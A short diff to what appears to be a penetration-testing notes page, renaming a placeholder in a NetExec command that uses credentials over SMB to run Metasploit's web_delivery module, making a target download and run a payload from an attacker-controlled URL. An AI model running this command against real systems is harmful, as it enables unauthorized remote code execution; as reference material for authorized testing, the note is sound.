@@ -5,7 +5,7 @@
 - Refer to [[Web Delivery|Metasploit Web Delivery]] module.
 
 ```
-$ netexec smb <IP> -u "<username>" -p "<password>" [-d <domain_name> | --local-auth] -M web_delivery -o URL=http://<attacker_IP>/[path/to/URI]
+$ netexec smb <IP> -u "<username>" -p "<password>" [-d <domain> | --local-auth] -M web_delivery -o URL=http://<attacker_IP>/[path/to/URI]
 ```
 
 ---
